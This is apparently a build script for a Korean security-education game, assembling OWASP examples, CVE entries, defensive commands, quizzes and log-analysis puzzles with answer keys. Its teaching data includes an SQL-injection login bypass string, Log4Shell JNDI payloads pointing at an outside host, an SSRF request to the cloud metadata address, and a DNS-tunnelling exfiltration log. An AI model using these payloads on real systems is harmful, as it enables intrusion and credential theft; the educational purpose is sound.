// 생성물(GB10 80B · agy) + Claude 검수 수정 → content.js
// 사용: node tools/build-content.mjs
import fs from 'node:fs';
const read = (f) => { try { return JSON.parse(fs.readFileSync(new URL(f, import.meta.url), 'utf8')); } catch (e) { console.warn('skip', f, e.message); return null; } };

const flavor = read('./out-content.json') || {};   // GB10: 대사·팁·결과 코멘트
const codex = read('./out-codex.json') || {};       // agy: OWASP 거점·CVE 도감·퀴즈
const out = {};

// ── 1) GB10 대사류: 오탈자·잘못된 안내 교정 ──
const fixText = (s) => String(s)
  .replace(/절필/g, '절실')
  .replace(/그出口/g, '그 출구')
  .replace(/[一-鿿]+/g, '')
  .trim();
for (const k of ['playerShouts', 'musouShouts', 'stageIntro']) if (Array.isArray(flavor[k])) out[k] = flavor[k].map(fixText).filter(Boolean);
if (flavor.enemyQuips) {
  out.enemyQuips = {};
  for (const [k, v] of Object.entries(flavor.enemyQuips)) out.enemyQuips[k] = v.map(fixText).filter((s) => s && s !== '아이티야!');
}
if (flavor.boss && flavor.boss.enter) out.boss = { enter: fixText(flavor.boss.enter), phase2: fixText(flavor.boss.phase2 || '') };
if (Array.isArray(flavor.resultComments)) out.resultComments = flavor.resultComments.map((r) => ({ min: r.min, lines: r.lines.map(fixText) }));
if (Array.isArray(flavor.tips)) {
  out.tips = flavor.tips.filter((t) => !/F키/.test(t)).map(fixText); // 조작키 오안내 제거 (필살기는 E)
  out.tips.unshift('J를 n번 친 뒤 K = 파생 강공격. JJJJ+K 는 ENTER 키 강타!', 'E 터미널: 보안 명령어를 정확히 치면 화면 전체 섬멸', '거점관리자를 쓰러뜨리면 OWASP 취약점 도감이 해금됩니다');
}

// ── 2) agy 학습 데이터: 정답 인덱스 누락(<conceptual_placeholder>) 교정 ──
// 검수 결과 agy는 정답을 항상 같은 자리에 두었다 → 아래 표로 확정, 위치는 게임에서 매번 셔플
const BASE_ANSWER = { injection: 0, 'broken-access-control': 1, 'cryptographic-failures': 1, 'vulnerable-components': 1, 'auth-failures': 0, ssrf: 1 };
// 공격 예시는 agy 문구가 추상적이라 구체적 페이로드로 교체
const BASE_ATTACK = {
  injection: "로그인 ID에 ' OR '1'='1' -- 입력으로 인증 우회",
  'broken-access-control': '/api/orders/1001 → 1002 로 바꿔 타인 주문 조회',
  'cryptographic-failures': '유출된 MD5 비밀번호 해시를 레인보우 테이블로 즉시 복원',
  'vulnerable-components': '패치 안 된 Log4j 2.14 서버에 ${jndi:ldap://…} 전송 → 원격 코드 실행',
  'auth-failures': '유출 계정 목록으로 수만 번 로그인 자동 시도(크리덴셜 스터핑)',
  ssrf: 'url=http://169.254.169.254/latest/meta-data/ 로 클라우드 자격증명 탈취',
};
if (Array.isArray(codex.bases) && codex.bases.length >= 6) {
  out.bases = codex.bases.slice(0, 6).map((b) => ({
    ...b,
    attack: BASE_ATTACK[b.id] || b.attack,
    quiz: { ...b.quiz, answer: BASE_ANSWER[b.id] ?? 0 },
  }));
}
// CVE: agy 8개 전부 사실 확인 완료(번호·CVSS·제품). 정답은 모두 0번 보기.
const CVE_FIX = {
  'CVE-2021-44228': { summary: '로그 문자열의 JNDI 조회(${jndi:ldap://…})로 원격 코드가 실행되는 취약점.', fix: 'Log4j 2.17.1 이상으로 업데이트, JNDI 조회 비활성화.' },
  'CVE-2022-22965': { product: 'Spring Framework (JDK 9+)', fix: 'Spring Framework 5.3.18 / 5.2.20 이상으로 업데이트.' },
  'CVE-2017-5638': { name: 'Struts2 RCE', summary: 'Content-Type 헤더의 OGNL 식이 실행되는 원격 코드 실행. Equifax 유출의 원인.' },
  'CVE-2020-1472': { summary: 'Netlogon 암호 초기화(AES-CFB8) 결함으로 도메인 컨트롤러 관리자 권한을 탈취할 수 있는 취약점.' },
  'CVE-2023-34362': { summary: 'MOVEit Transfer 웹앱의 SQL 인젝션. Cl0p 랜섬웨어 조직이 대규모 데이터 탈취에 악용.' },
  'CVE-2024-3094': { summary: 'XZ Utils 5.6.0·5.6.1 배포본에 숨겨진 백도어가 sshd 인증을 가로채는 공급망 공격.' },
};
if (Array.isArray(codex.cves) && codex.cves.length >= 4) {
  const cves = codex.cves.map((c) => ({ ...c, ...(CVE_FIX[c.cve] || {}), quiz: { ...c.quiz, answer: 0 } }));
  // Claude가 추가한 검증된 CVE 2개
  cves.push(
    { name: 'EternalBlue', cve: 'CVE-2017-0144', cvss: 8.8, product: 'Microsoft SMBv1',
      summary: 'SMBv1 처리 결함으로 원격 코드 실행. WannaCry 랜섬웨어 확산에 사용.',
      fix: 'MS17-010 패치, SMBv1 비활성화, 445 포트 외부 차단.',
      quiz: { q: 'EternalBlue를 이용해 퍼진 랜섬웨어는?', choices: ['WannaCry', 'Stuxnet', 'Mirai'], answer: 0, explain: '2017년 WannaCry가 SMBv1 취약점(MS17-010)으로 웜처럼 확산했습니다.' } },
    { name: 'BlueKeep', cve: 'CVE-2019-0708', cvss: 9.8, product: 'Windows RDP (구버전)',
      summary: '인증 전 RDP 요청만으로 원격 코드 실행이 가능한 웜 가능 취약점.',
      fix: '보안 업데이트 적용, NLA 활성화, RDP 외부 노출 금지.',
      quiz: { q: 'BlueKeep 완화책으로 옳은 것은?', choices: ['NLA 활성화', 'RDP를 인터넷에 직접 노출', '화면 해상도 낮추기'], answer: 0, explain: 'NLA는 인증을 먼저 요구해 인증 전 공격을 어렵게 합니다. 근본책은 패치.' } },
  );
  out.cves = cves;
}

// ── 3) 타이핑 명령어: GB10 초안을 검수 — 사실 오류·가짜 도구·오타 옵션 제거/수정 ──
// 제거: curl --insecure("MITM 방지"라는 설명이 정반대), ssrf-checker(존재하지 않는 도구),
//       npm audit --level(잘못된 옵션), 중복 grep, 너무 긴 명령
out.commands = [
  { cmd: 'chmod 600 ~/.ssh/id_ed25519', desc: 'SSH 개인키를 본인만 읽게 해 키 탈취 방지', tag: 'access' },
  { cmd: 'visudo -c', desc: 'sudoers 문법 검증으로 권한 설정 사고 예방', tag: 'access' },
  { cmd: 'chattr +i /etc/passwd', desc: '불변 속성으로 계정 파일 무단 변조 차단', tag: 'access' },
  { cmd: 'find / -perm -4000 -type f', desc: 'SUID 파일 점검으로 권한 상승 경로 탐지', tag: 'access' },
  { cmd: 'sshd -t', desc: 'SSH 설정 검증으로 잘못된 인증 설정 탐지', tag: 'auth' },
  { cmd: 'fail2ban-client status sshd', desc: 'SSH 무차별 대입 차단 현황 확인', tag: 'auth' },
  { cmd: 'passwd -l guest', desc: '불필요한 계정을 잠가 무단 로그인 차단', tag: 'auth' },
  { cmd: 'gpg --verify file.sig file', desc: '서명 검증으로 위조·변조 파일 탐지', tag: 'crypto' },
  { cmd: 'openssl rand -base64 32', desc: '안전한 난수로 추측 불가능한 토큰 생성', tag: 'crypto' },
  { cmd: 'openssl version', desc: 'OpenSSL 버전 확인으로 Heartbleed 등 점검', tag: 'crypto' },
  { cmd: 'gitleaks detect', desc: '저장소에 커밋된 비밀키·토큰 유출 탐지', tag: 'crypto' },
  { cmd: 'iptables -A INPUT -s 203.0.113.7 -j DROP', desc: '공격 IP의 인바운드 트래픽 차단', tag: 'network' },
  { cmd: 'ufw deny 445/tcp', desc: 'SMB 포트 차단으로 EternalBlue류 웜 차단', tag: 'network' },
  { cmd: 'ufw default deny incoming', desc: '기본 거부 정책으로 불필요한 포트 노출 차단', tag: 'network' },
  { cmd: 'sysctl -w net.ipv4.tcp_syncookies=1', desc: 'SYN 쿠키로 SYN 플러드(DDoS) 완화', tag: 'network' },
  { cmd: 'ss -tulpn', desc: '열린 포트·프로세스 확인으로 의심 서비스 탐지', tag: 'network' },
  { cmd: 'iptables -A OUTPUT -d 169.254.169.254 -j DROP', desc: '메타데이터 주소 차단으로 SSRF 피해 축소', tag: 'ssrf' },
  { cmd: 'clamscan -r -i /var/www', desc: '웹 디렉터리 악성코드·웹셸 검사', tag: 'malware' },
  { cmd: 'file invoice.pdf.exe', desc: '실제 파일 형식 확인으로 확장자 위장 탐지', tag: 'malware' },
  { cmd: 'grep -rn eval /var/www', desc: 'eval 사용 코드 점검으로 코드 인젝션 위험 탐지', tag: 'injection' },
  { cmd: 'semgrep --config auto .', desc: '정적 분석으로 인젝션 등 취약 코드 탐지', tag: 'injection' },
  { cmd: 'npm audit --audit-level=high', desc: 'npm 의존성의 고위험 취약점 검사', tag: 'component' },
  { cmd: 'npm audit fix', desc: '취약한 npm 패키지를 안전한 버전으로 갱신', tag: 'component' },
  { cmd: 'pip-audit -r requirements.txt', desc: 'Python 패키지 알려진 취약점 검사', tag: 'component' },
  { cmd: 'trivy image nginx:latest', desc: '컨테이너 이미지 취약점(CVE) 스캔', tag: 'component' },
  { cmd: 'sha256sum -c sha256sums.txt', desc: '해시 검증으로 다운로드 파일 변조 탐지', tag: 'component' },
  { cmd: 'sudo apt update && sudo apt upgrade', desc: '알려진 취약점이 있는 패키지 일괄 패치', tag: 'component' },
];

// ── 4) 문제은행 (GB10 생성 → Claude 사실 검증·교정) ──
const bank = read('./out-bank.fixed.json') || [];
const BANK_DROP = new Set([5, 57]); // 5: 근거 없는 주장, 57: 제로 트러스트 중복
const BANK_FIX = {
  7: { choices: ['업무별로 필요한 권한만 부여', '관리자 계정으로 일상 업무·웹서핑', '관리 작업 때만 sudo로 권한 상승'], answer: 1, explain: '관리자 계정으로 일상 업무를 하면 악성코드가 곧바로 관리자 권한을 얻습니다. 평소엔 일반 계정, 필요할 때만 권한 상승.' },
  9: { q: '보기 중 침해사고 대응에서 가장 먼저 오는 단계는?' },
  14: { choices: ['SYN 플러드, HTTP 플러드, DNS 증폭', 'SQL 인젝션, XSS, CSRF', '피싱, 스미싱, 비싱'] },
  29: { choices: ['지식 기반(아는 것)', '소유 기반(가진 것)', '생체 기반(나 자신인 것)'], answer: 2, explain: '지문·얼굴은 생체(Inherence) 요소입니다. MFA는 지식·소유·생체 중 서로 다른 두 가지 이상을 조합합니다.' },
  42: { choices: ['AEAD 암호화', '(EC)DHE 전방 비밀성', '정적 RSA 키 교환'], answer: 2, explain: 'TLS 1.3은 정적 RSA 키 교환·압축·RC4 등 취약 요소를 제거하고 (EC)DHE 전방 비밀성과 AEAD 암호만 허용합니다.' },
  51: { q: '해시함수의 "역상 저항성(Preimage Resistance)"이란?', explain: '역상 저항성은 해시값만 보고 원래 입력을 찾아내기 어렵다는 성질입니다. 같은 해시를 갖는 두 입력을 찾기 어려운 것은 충돌 저항성입니다.' },
  53: { choices: ['SYN 플러드', 'HTTP 플러드', 'UDP 플러드'] },
  59: { explain: '서버는 개인키로 핸드셰이크 데이터에 서명하고, 클라이언트는 인증서에 담긴 서버 공개키로 그 서명을 검증합니다(인증서 자체는 CA 공개키로 검증).' },
  61: { q: 'SSRF 방어에서 "목적지 허용 목록(allowlist)"이란?' },
};
const fixTypo = (t) => String(t).replace(/스TEE링/g, '스터핑').replace(/物/g, '');
out.bank = bank.map((x, i) => ({ ...x, ...(BANK_FIX[i] || {}) }))
  .filter((_, i) => !BANK_DROP.has(i))
  .map((x) => ({ q: fixTypo(x.q), choices: x.choices.map(fixTypo), answer: x.answer, explain: fixTypo(x.explain), level: x.level, tag: x.tag }));

// ── 5) 로그 분석 문제 (GB10 생성 → Claude 검증: 근거가 로그에 없는 문제 제거·오답 교정) ──
const logs = read('./out-logs.json') || [];
const LOG_DROP = new Set([3, 7, 18, 20, 25, 31, 32]); // 3: admin-ajax 정상 요청을 웹셸로 단정 · 7/31: SYN 1건만으로 스캔 단정 · 18: /admin 1건 · 20: passwd는 정상 명령 · 25/32: PAM 1건으로 스터핑 단정
const LOG_FIX = {
  5: { choices: ['기본 계정 대입 시도', 'SQL 인젝션', 'XSS 공격'], answerIndex: 0, explain: 'admin/admin 같은 기본 자격증명으로 로그인을 시도해 401로 실패. 기본 계정 비활성화·변경이 대응책.' },
  9: { explain: '존재하지 않는 계정(invalid user test)으로의 실패 — 흔한 계정명을 돌려가며 넣는 무차별 대입의 전형.' },
  14: { log: '203.0.113.9 - - [10/Oct/2023:15:20:55 +0900] "GET / HTTP/1.1" 200 512 "-" "${jndi:ldap://198.51.100.9:1389/a}"', explain: 'User-Agent에 ${jndi:ldap://…} 문자열 — 취약한 Log4j가 이를 로그에 기록하는 순간 원격 클래스를 조회(Log4Shell).' },
  15: { log: 'dns-query: client 10.0.4.22 query: aGVsbG8tZXhmaWwtZGF0YS0wMDE.x9f2.tunnel.example.net IN TXT', explain: '내부 PC가 base64처럼 보이는 긴 하위 도메인으로 TXT 질의를 반복 — DNS 질의에 데이터를 실어 나르는 DNS 터널링 징후.' },
  24: { choices: ['취약점 스캐닝(WPScan)', '정상 웹 요청', 'XSS 공격'], answerIndex: 0, explain: 'User-Agent가 WPScan이고 취약 이력이 있는 wp-file-manager 플러그인의 readme를 확인 — 자동화된 취약점 스캐닝.' },
  29: { choices: ['노출된 RDP 탐색 시도', '정상 RDP 접속', 'SQL 인젝션'], answerIndex: 0, explain: '외부에서 3389(RDP)로 들어온 연결이 방화벽에 차단됨 — 인터넷에 노출된 RDP를 찾는 탐색. RDP는 VPN 뒤로 숨겨야 한다.' },
  36: { choices: ['웹셸·명령 실행 의심', '정상 웹서버 동작', 'DNS 터널링'], answerIndex: 0, explain: '웹서버(www-data/apache2)가 /bin/bash를 실행 — 웹셸이나 명령 주입이 성공했을 때의 대표 징후.' },
  38: { explain: 'Googlebot User-Agent의 일반 크롤링. 단, UA는 위조 가능하므로 실무에선 역방향 DNS로 진짜 구글인지 확인한다.' },
};
out.logs = logs.map((x, i) => ({ ...x, ...(LOG_FIX[i] || {}) })).filter((_, i) => !LOG_DROP.has(i))
  .map((x) => ({ log: x.log, choices: x.choices, answerIndex: x.answerIndex, explain: x.explain, level: x.level }));

// ── 6) 침해사고 대응 훈련 시나리오 · 직장 스트레스 몹 (agy 기획, 검토 완료) ──
const mission = read('./out-mission.json');
if (mission && Array.isArray(mission.stages)) {
  out.mission = { title: mission.title, stages: mission.stages, reportChecklist: mission.reportChecklist };
  out.officeMobs = mission.officeMobs;
}

// ── 7) 월간 CVE 팩 (tools/cve-packs/YYYY-MM.json, Claude 검수 완료분만) ──
{
  const dir = new URL('./cve-packs/', import.meta.url);
  let files = [];
  try { files = fs.readdirSync(dir).filter((f) => /^\d{4}-\d{2}\.json$/.test(f)).sort(); } catch { /* 팩 없음 */ }
  out.cves = out.cves || [];
  for (const f of files) {
    const pack = JSON.parse(fs.readFileSync(new URL(f, dir), 'utf8'));
    if (pack.status !== 'verified') { console.warn('skip unverified pack', f); continue; }
    for (const c of pack.cves) if (!out.cves.some((x) => x.cve === c.cve)) out.cves.push({ ...c, kev: true, month: pack.month });
    console.log('merged pack', f, pack.cves.length);
  }
}

fs.writeFileSync(new URL('../content.js', import.meta.url),
  '/* 자동 생성: tools/build-content.mjs — GB10 Qwen3-Coder-Next 80B(대사) + agy(학습 데이터) + Claude 검수 */\n' +
  'window.GAME_CONTENT = ' + JSON.stringify(out, null, 1) + ';\n', 'utf8');
console.log('content.js written:', Object.fromEntries(Object.entries(out).map(([k, v]) => [k, Array.isArray(v) ? v.length : Object.keys(v).length])));
